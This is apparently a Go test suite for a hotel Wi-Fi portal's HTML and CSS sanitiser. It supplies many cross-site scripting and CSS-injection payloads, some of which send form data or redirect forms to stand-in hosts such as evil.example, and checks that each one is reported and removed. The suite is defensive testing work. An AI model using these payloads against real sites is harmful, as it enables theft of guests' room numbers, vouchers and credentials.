package portaldesign

// THE ADVERSARIAL SUITE.
//
// Every case below is a way a real attempt would be spelled against the page that collects room numbers,
// surnames and voucher codes. Each one asserts TWO things: that the sanitiser reports it (so edged refuses the
// design and tells the operator why), and that the sanitised output -- what portald actually serves -- no longer
// contains the dangerous part. Reporting without removing would leave portald's defence in depth empty;
// removing without reporting would let an operator believe the page shows what they wrote.

import (
	"strings"
	"testing"
)

func hasError(issues []Issue) bool { return len(Errors(issues)) > 0 }

func TestHTMLRefusesEveryKnownWayToRunScriptOrStealTheForm(t *testing.T) {
	for _, tc := range []struct {
		name, in       string
		mustNotContain []string
	}{
		{"a script element", `<script>fetch('//x/'+document.forms[0].room.value)</script>`, []string{"<script", "fetch"}},
		{"mixed-case script", `<ScRiPt>alert(1)</ScRiPt>`, []string{"<script", "alert"}},
		{"img/onerror with no whitespace", `<img/onerror=alert(1) src=x>`, []string{"onerror"}},
		{"img onerror", `<img src=x onerror="fetch('//x')">`, []string{"onerror", "fetch"}},
		{"an inline click handler", `<div onclick="steal()">Welcome</div>`, []string{"onclick", "steal"}},
		{"upper-case handler", `<p ONMOUSEOVER="steal()">x</p>`, []string{"onmouseover", "steal"}},
		// <base> contains no script at all and re-points the voucher and credentials forms' RELATIVE actions.
		{"base href", `<base href="https://evil.example/">`, []string{"<base", "evil"}},
		{"a button that re-targets the voucher form", `<button form="form-voucher" formaction="https://evil.example/c">Go</button>`, []string{"<button", "formaction", "evil"}},
		{"meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example/">`, []string{"<meta", "refresh"}},
		{"a stylesheet link", `<link rel="stylesheet" href="https://evil.example/x.css">`, []string{"<link", "evil"}},
		{"a style element inside the fragment", `<style>form{display:none}</style><p>hi</p>`, []string{"<style", "display"}},
		{"entity-encoded javascript colon", `<a href="javascript&#58;alert(1)">Help</a>`, []string{"javascript", "alert"}},
		{"entity-encoded first letter", `<a href="&#106;avascript:alert(1)">Help</a>`, []string{"avascript", "alert"}},
		{"a tab inside the scheme", `<a href="jav&#x09;ascript:alert(1)">Help</a>`, []string{"ascript", "alert"}},
		{"leading spaces before the scheme", `<a href="   javascript:alert(1)">Help</a>`, []string{"javascript"}},
		{"an unquoted javascript href", `<a href=javascript:alert(1)>Help</a>`, []string{"javascript"}},
		{"a data: text/html link", `<a href="data:text/html,<script>alert(1)</script>">x</a>`, []string{"data:", "script"}},
		{"a vbscript link", `<a href="vbscript:msgbox(1)">x</a>`, []string{"vbscript"}},
		{"a protocol-relative link", `<a href="//evil.example/">x</a>`, []string{"evil"}},
		{"a backslash-relative link", `<a href="/\evil.example/">x</a>`, []string{"evil"}},
		{"plain http", `<a href="http://evil.example/">x</a>`, []string{"evil"}},
		{"userinfo that reads like the hotel", `<a href="https://reception@evil.example/">x</a>`, []string{"evil"}},
		{"a unicode-escape-looking scheme", `<a href="javascript:alert(1)">x</a>`, []string{"avascript"}},
		{"an iframe", `<iframe src="https://evil.example"></iframe>`, []string{"<iframe", "evil"}},
		{"iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`, []string{"srcdoc", "script"}},
		{"an object", `<object data="https://evil.example"></object>`, []string{"<object"}},
		{"an embed", `<embed src="https://evil.example/x.swf">`, []string{"<embed"}},
		// A SECOND FORM: no script at all, and it posts the guest's room number wherever it likes.
		{"a second form", `<form action="https://evil.example"><input name="room"></form>`, []string{"<form", "<input", "evil"}},
		{"svg onload", `<svg onload="alert(1)"><circle r="4"/></svg>`, []string{"<svg", "onload"}},
		{"script inside svg", `<svg><script>alert(1)</script></svg>`, []string{"<svg", "<script"}},
		{"the math/style mutation-XSS shape", `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`, []string{"onerror", "<math", "<style"}},
		{"noscript attribute smuggling", `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`, []string{"onerror"}},
		{"a template", `<template><img src=x onerror=alert(1)></template>`, []string{"onerror", "<template"}},
		{"a null byte in the tag name", "<scr\x00ipt>alert(1)</scr\x00ipt>", []string{"<script", "<scr"}},
		{"an id that collides with the voucher form", `<div id="form-voucher">x</div>`, []string{"form-voucher"}},
		{"a name that clobbers document.cookie", `<img name="cookie" src="/assets/a.png">`, []string{"cookie"}},
		{"a data attribute the page's script reads", `<span data-i18n="btn.login">x</span>`, []string{"data-i18n"}},
		{"an SVG image by data URI", `<img src="data:image/svg+xml;base64,PHN2Zz4=">`, []string{"svg"}},
		{"an image that is really the sign-in endpoint", `<img src="/auth/voucher">`, []string{"/auth/voucher"}},
		{"a dot-segment escape from assets", `<img src="/assets/../auth/voucher">`, []string{"voucher"}},
		{"srcset", `<img src="/assets/a.png" srcset="https://evil.example/x 2x">`, []string{"srcset", "evil"}},
		{"a target other than a new tab", `<a href="https://ok.example/" target="_top">x</a>`, []string{"_top"}},
		{"expression() in a style attribute", `<div style="width: expression(alert(1))">x</div>`, []string{"expression"}},
		{"a script URL in a style attribute", `<div style="background: url(javascript:alert(1))">x</div>`, []string{"javascript"}},
		{"xlink:href", `<a xlink:href="javascript:alert(1)">x</a>`, []string{"javascript"}},
		{"a label that could hijack a field", `<label for="voucher">Click</label>`, []string{"<label", "for="}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			out, issues := SanitizeHTML(tc.in)
			if !hasError(issues) {
				t.Errorf("not reported: %q produced no error (output %q)", tc.in, out)
			}
			low := strings.ToLower(out)
			for _, bad := range tc.mustNotContain {
				if strings.Contains(low, strings.ToLower(bad)) {
					t.Errorf("sanitised output still contains %q: %q", bad, out)
				}
			}
			for _, i := range issues {
				if len(i.Message) < 12 || i.Field != "custom_html" {
					t.Errorf("finding does not explain itself: %+v", i)
				}
			}
		})
	}
}

func TestHTMLThatOnlyLooksLikeATagIsRenderedAsText(t *testing.T) {
	// "< script >" is not a tag to any browser -- the parser reads it as text -- and it leaves here escaped.
	out, _ := SanitizeHTML("< script >alert(1)</ script >")
	if strings.Contains(out, "<script") || strings.Contains(out, "< script") {
		t.Fatalf("text that looked like a tag was emitted as markup: %q", out)
	}
	if !strings.Contains(out, "&lt; script &gt;") {
		t.Fatalf("the text should survive, escaped: %q", out)
	}
	// An unclosed tag at the end of the input is dropped by the parser, as in a browser.
	out, _ = SanitizeHTML(`<div>hello <img src=x onerror=alert(1)`)
	if strings.Contains(out, "onerror") {
		t.Fatalf("an unterminated tag reached the output: %q", out)
	}
	// Decoded entities are re-escaped on the way out.
	out, _ = SanitizeHTML(`<p>&lt;img src=x onerror=alert(1)&gt;</p>`)
	if strings.Contains(out, "<img") {
		t.Fatalf("entity-encoded text became markup: %q", out)
	}
}

func TestHTMLKeepsWhatAHotelActuallyWrites(t *testing.T) {
	for _, in := range []string{
		`<p class="small">Ask reception for help on extension <strong>9</strong>.</p>`,
		`<section class="amenities"><h2>Around the resort</h2><ul><li>Pool <em>08:00–20:00</em></li><li>Spa</li></ul></section>`,
		`<table class="hours"><thead><tr><th scope="col">Venue</th><th>Hours</th></tr></thead><tbody><tr><td>Pool</td><td colspan="2">08:00–20:00</td></tr></tbody></table>`,
		`<figure><img src="/assets/0a1b2c.png" alt="Pool" width="320" height="200"><figcaption>Our pool</figcaption></figure>`,
		`<a href="https://coralsea.example/terms" target="_blank">Terms</a>`,
		`<a href="/assets/menu.pdf">Menu</a> <a href="tel:+201000000">Call us</a> <a href="mailto:frontdesk@hotel.example">Email</a> <a href="#top">Top</a>`,
		`<div role="note" aria-label="Wi-Fi help" style="padding: 12px; border-radius: 8px; background: url(/assets/tile.png)">Need help? Dial 9.</div>`,
		`<p dir="rtl" lang="ar">مرحبا</p>`,
		`<img src="data:image/png;base64,iVBORw0KGgo=" alt="">`,
	} {
		out, issues := SanitizeHTML(in)
		if len(issues) > 0 {
			t.Errorf("an ordinary fragment was reported: %q → %v", in, issues)
		}
		if strings.TrimSpace(out) == "" {
			t.Errorf("an ordinary fragment was emptied: %q", in)
		}
	}
	// A new-tab link always carries noopener noreferrer, whatever was written.
	out, _ := SanitizeHTML(`<a href="https://x.example/" target="_blank" rel="opener">x</a>`)
	if !strings.Contains(out, `rel="noopener noreferrer"`) || strings.Contains(out, `rel="opener"`) {
		t.Errorf("a new-tab link did not get noopener noreferrer: %q", out)
	}
}

func TestHTMLUnwrapsUnsupportedTagsButKeepsTheirText(t *testing.T) {
	out, issues := SanitizeHTML(`<center><font color="red">Welcome</font></center>`)
	if !hasError(issues) {
		t.Error("an unsupported tag was not reported")
	}
	if out != "Welcome" {
		t.Errorf("the text inside unsupported tags should survive on its own, got %q", out)
	}
}

func TestHTMLBoundsNesting(t *testing.T) {
	in := strings.Repeat("<div>", MaxFragmentDepth+10) + "deep" + strings.Repeat("</div>", MaxFragmentDepth+10)
	out, issues := SanitizeHTML(in)
	if !hasError(issues) {
		t.Error("pathological nesting was not reported")
	}
	if strings.Count(out, "<div>") > MaxFragmentDepth {
		t.Errorf("output nests deeper than the bound: %d", strings.Count(out, "<div>"))
	}
}

func TestCSSRefusesLoadersAndExecutables(t *testing.T) {
	for _, tc := range []struct {
		name, in, mustNotContain string
	}{
		{"@import url", `@import url("//evil.example/x.css");`, "import"},
		{"@import string", `@import 'https://evil.example/x.css';`, "import"},
		{"escaped @import", `@\69mport url(https://evil.example/x.css);`, "evil"},
		{"@charset", `@charset "utf-7";`, "charset"},
		{"@namespace", `@namespace svg url(http://www.w3.org/2000/svg);`, "namespace"},
		{"expression()", `body { width: expression(alert(1)); }`, "expression"},
		{"escaped expression()", `body { width: ex\70ression(alert(1)); }`, "alert"},
		{"expression with a space", `body { width: expression (alert(1)); }`, "alert"},
		{"behavior", `body { behavior: url(#default#time2); }`, "behavior"},
		{"-moz-binding", `body { -moz-binding: url(https://evil.example/x.xml#x); }`, "binding"},
		{"a javascript url()", `a { background: url(javascript:alert(1)); }`, "javascript"},
		{"a quoted javascript url()", `a { background: url("javascript:alert(1)"); }`, "javascript"},
		{"plain http", `a { background: url(http://evil.example/x.png); }`, "evil"},
		{"escaped url(", `a { background: u\72l(http://evil.example/x.png); }`, "evil"},
		{"a comment splitting url", `a { background: u/**/rl(http://evil.example/x); }`, "evil"},
		{"protocol-relative", `a { background: url(//evil.example/x.png); }`, "evil"},
		{"an appliance path that is not an asset", `a { background: url(/auth/voucher); }`, "voucher"},
		{"image-set with a string", `a { background-image: image-set("https://evil.example/x.png" 1x); }`, "image-set"},
		{"src()", `a { background-image: src("https://evil.example/x.png"); }`, "src("},
		{"a style-end sequence", `</style><script>alert(1)</script>`, "</style"},
		{"an unknown at-rule", `@document url-prefix() { a { color: red } }`, "@document"},
		{"a bad custom property", `:root { --x: url(http://evil.example/x.png); }`, "evil"},
		{"a font from http", `@font-face { font-family: X; src: url(http://evil.example/x.woff2); }`, "evil"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			out, issues := SanitizeCSS(tc.in)
			if !hasError(issues) {
				t.Errorf("not reported: %q (output %q)", tc.in, out)
			}
			if strings.Contains(strings.ToLower(out), strings.ToLower(tc.mustNotContain)) {
				t.Errorf("sanitised output still contains %q: %q", tc.mustNotContain, out)
			}
		})
	}
}

// !important IN A LAYER BEATS EVERY NORMAL UNLAYERED DECLARATION. The portal wraps this sheet in @layer hotel
// and keeps an unlayered guard over the sign-in controls; the guard only holds if nothing here is important.
func TestCSSRemovesImportantSoTheGuardCannotBeOutranked(t *testing.T) {
	for _, in := range []string{
		`form { display: none !important; }`,
		`form{display:none!important}`,
		`form { display: none ! IMPORTANT }`,
		`form { display: none !\69mportant }`,
		`@media (min-width: 1px) { .panel.active { visibility: hidden !important } }`,
		`.a { &:hover { opacity: 0 !important } }`,
	} {
		out, issues := SanitizeCSS(in)
		if hasError(issues) {
			t.Errorf("%q: !important should be a warning, not a refusal: %v", in, issues)
		}
		if len(issues) == 0 || issues[0].Severity != SeverityWarning {
			t.Errorf("%q: the removal was not reported as a warning: %v", in, issues)
		}
		if strings.Contains(strings.ToLower(out), "important") {
			t.Errorf("%q: !important survived: %q", in, out)
		}
	}
	// !important inside a string is text, not a priority.
	out, _ := SanitizeCSS(`.x::after { content: "!important"; }`)
	if !strings.Contains(out, `"!important"`) {
		t.Errorf("a string was mangled: %q", out)
	}
}

// A STRAY BRACE MUST NOT ESCAPE THE LAYER. The page inserts "@layer hotel {" + sheet + "}"; a sheet that closed
// the brace itself would put what followed outside the layer, where it outranks the guard.
func TestCSSOutputIsAlwaysBalanced(t *testing.T) {
	for _, in := range []string{
		`} form { display: none } .x {`,
		`.a { color: red; } } } form { display: none }`,
		`.a { color: red;`,
		`@media screen { .a { color: red }`,
		`.a { content: "}"; }`,
	} {
		out, _ := SanitizeCSS(in)
		stripped := stripStrings(out)
		if strings.Count(stripped, "{") != strings.Count(stripped, "}") {
			t.Errorf("%q produced unbalanced output %q", in, out)
		}
		wrapped := "@layer hotel {\n" + out + "\n}"
		if strings.Count(stripStrings(wrapped), "}") != strings.Count(stripStrings(wrapped), "{") {
			t.Errorf("the layer wrapper is unbalanced for %q", in)
		}
	}
}

func stripStrings(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); {
		if s[i] == '"' || s[i] == '\'' {
			i = scanString(s, i)
			continue
		}
		b.WriteByte(s[i])
		i++
	}
	return b.String()
}

func TestCSSKeepsWhatAHotelActuallyWrites(t *testing.T) {
	for _, in := range []string{
		`.card { box-shadow: 0 10px 40px rgba(0,0,0,.2); } .tab { letter-spacing: .02em; }`,
		`.a { color: red; &:hover { color: blue; } }`,
		`@media (max-width: 600px) { .card { padding: 0 } }`,
		`@supports (backdrop-filter: blur(4px)) { .card { backdrop-filter: blur(4px) } }`,
		`@font-face { font-family: "Hotel Sans"; src: url(/assets/hotel.woff2) format("woff2"), local("Arial"); }`,
		`@keyframes rise { from { transform: translateY(4px) } to { transform: none } }`,
		`.hero { background: linear-gradient(#0008, #0008), url("https://cdn.example.com/resort.jpg") center/cover; }`,
		`.x::before { content: "\2022"; }`,
		`.bg { background-image: url(data:image/png;base64,iVBORw0KGgo=); }`,
		`:root { --accent: #0f6b63; } .x { color: var(--accent); }`,
	} {
		out, issues := SanitizeCSS(in)
		if len(issues) > 0 {
			t.Errorf("ordinary CSS was reported: %q → %v", in, issues)
		}
		if strings.TrimSpace(out) == "" {
			t.Errorf("ordinary CSS was emptied: %q", in)
		}
	}
	out, _ := SanitizeCSS(`.x::before { content: "\2022"; }`)
	if !strings.Contains(out, `"\2022"`) {
		t.Errorf("an escape inside a string was not preserved: %q", out)
	}
}

func TestLinkAndImageRules(t *testing.T) {
	for _, good := range []string{"https://hotel.example/terms", "/assets/terms.pdf", "/terms"} {
		if _, err := CheckLinkURL(good); err != nil {
			t.Errorf("link %q refused: %v", good, err)
		}
	}
	for _, bad := range []string{
		"javascript:alert(1)", " javascript:alert(1)", "java\tscript:alert(1)", "http://hotel.example/terms",
		"//evil.example/", `/\evil.example`, "data:text/html,x", "https://user@evil.example/", "ftp://x/",
		"mailto:x@y", "hotel.example/terms",
	} {
		if _, err := CheckLinkURL(bad); err == nil {
			t.Errorf("link %q accepted", bad)
		}
	}
	for _, good := range []string{"/assets/logo.png", "https://cdn.example.com/l.png", "data:image/png;base64,AAAA", "DATA:IMAGE/JPEG;BASE64,AAAA"} {
		if _, err := CheckImageURL(good); err != nil {
			t.Errorf("image %q refused: %v", good, err)
		}
	}
	for _, bad := range []string{"http://evil.example/logo.png", "javascript:alert(1)", "//evil.example/logo.png",
		"ftp://example/logo.png", "data:image/svg+xml;base64,PHN2Zz4=", "data:text/html;base64,AAAA", "data:image/png;base64,AA\"AA"} {
		if _, err := CheckImageURL(bad); err == nil {
			t.Errorf("image %q accepted", bad)
		}
	}
}
